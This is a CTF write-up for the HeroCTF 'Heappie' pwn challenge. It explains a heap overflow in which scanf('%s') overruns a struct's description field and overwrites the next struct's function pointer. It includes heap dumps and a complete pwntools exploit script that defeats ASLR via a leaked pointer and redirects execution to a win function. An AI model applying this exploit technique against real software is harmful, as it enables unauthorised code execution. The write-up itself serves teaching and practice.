https://ctftime.org/event/2496

# Heappie (pwn)

Heappie is a simple application that allows you to save and play your favorite songs. Find a way to exploit it and read the flag.

nc pwn.heroctf.fr 6000

## Analysis

We have a heap buffer overflow in `add_music`:

```C
printf("Enter music description: ");
scanf("%s", music->description);
```

We can see that `description` is the last member of the `Music` struct:

```C
typedef struct Music {
    void (*play)(struct Music*);

    char title[32];
    char artist[32];
    char description[128];
} Music;
```

This means that when we overflow it we will start writing into the next `Music`'s memory

We can test this with `vis_heap_chunks` in `pwndbg` by sending the following payload for the description:

```python
payload = b""
payload += b"B" * 128
payload += p64(elf.sym["win"]) # p64(0x000062fb82a151f9)
```

```
pwndbg> vis_heap_chunks
...
0x62fb84018290	0x0000000000000000	0x00000000000007e1	................
# Music[0] @ 0x62fb840182a0
0x62fb840182a0	0x000062fb82a152e9	0x0000000000000041	.R...b..A.......
0x62fb840182b0	0x0000000000000000	0x0000000000000000	................
0x62fb840182c0	0x0000000000000000	0x0000000000000041	........A.......
0x62fb840182d0	0x0000000000000000	0x0000000000000000	................
0x62fb840182e0	0x0000000000000000	0x0000000000000041	........A.......
0x62fb840182f0	0x0000000000000000	0x0000000000000000	................
0x62fb84018300	0x0000000000000000	0x0000000000000000	................
0x62fb84018310	0x0000000000000000	0x0000000000000000	................
0x62fb84018320	0x0000000000000000	0x0000000000000000	................
0x62fb84018330	0x0000000000000000	0x0000000000000000	................
0x62fb84018340	0x0000000000000000	0x0000000000000000	................
0x62fb84018350	0x0000000000000000	0x0000000000000000	................
0x62fb84018360	0x0000000000000000	0x0000000000000000	................
# Music[1] @ 0x62fb84018370
0x62fb84018370	0x0000000000000041	0x0000000000000000	A...............
0x62fb84018380	0x0000000000000000	0x0000000000000000	................
0x62fb84018390	0x0000000000000041	0x0000000000000000	A...............
0x62fb840183a0	0x0000000000000000	0x0000000000000000	................
0x62fb840183b0	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
0x62fb840183c0	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
0x62fb840183d0	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
0x62fb840183e0	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
0x62fb840183f0	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
0x62fb84018400	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
0x62fb84018410	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
0x62fb84018420	0x4242424242424242	0x4242424242424242	BBBBBBBBBBBBBBBB
# Music[2] @ 0x62fb84018430
0x62fb84018430	0x000062fb82a151f9	0x0000000000000041	.Q...b..A.......
0x62fb84018440	0x0000000000000000	0x0000000000000000	................
0x62fb84018450	0x0000000000000000	0x0000000000000041	........A.......
0x62fb84018460	0x0000000000000000	0x0000000000000000	................
0x62fb84018470	0x0000000000000000	0x0000000000000041	........A.......
...
```

We can see the value of `0x000062fb82a151f9` or `win` at `0x62fb84018430` which is the location of the next `Music`'s `play` function pointer.

## Solution

1) Add music with a play function so we can leak its address
2) Compute the image base using `play_1`, `play_2` and `play_3` looking for a base aligned to a 4K boundry
3) Add music overflowing the description such that the next `Music`'s `play` function pointer is set equal to the address of the `win` function
4) Add music taking care not to overwrite the value in the `play` function pointer
5) Play the last `Music` in the list this will call `win`

```python
#!/usr/bin/env python3

from pwn import *
import ctypes

#context.log_level = "debug"
elf = ELF("./heappie", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("pwn.heroctf.fr", 6000)

def add_music(play, desc):
    p.sendlineafter(b">> ", b"1")
    p.sendlineafter(b"(y/n): ", play)
    p.sendlineafter(b"title: ", b"A")
    p.sendlineafter(b"artist: ", b"A")
    p.sendlineafter(b"description: ", desc)

def get_aslr_base():
    p.sendlineafter(b">> ", b"4")
    p.readuntil(b"song: ")
    leak = int(p.readline()[:-2].decode(), 16)
    base = leak - elf.sym["play_1"]
    if (base & 0xfff) == 0:
        return base
    base = leak - elf.sym["play_2"]
    if (base & 0xfff) == 0:
        return base
    base = leak - elf.sym["play_3"]
    return base

add_music(b"y", b"A")

elf.address = get_aslr_base()

payload = b""
payload += b"B" * 128
payload += p64(elf.sym["win"])
add_music(b"n", payload)

add_music(b"n", b"A")

p.sendlineafter(b">> ", b"2")
p.sendlineafter(b"index: ", b"2")
p.readuntil(b"Flag: ")
log.success(p.readline().decode()) # Hero{b4s1c_H3AP_0verfL0w!47280319}
```

## Flag
`Hero{b4s1c_H3AP_0verfL0w!47280319}`

smiley 2024/10/27
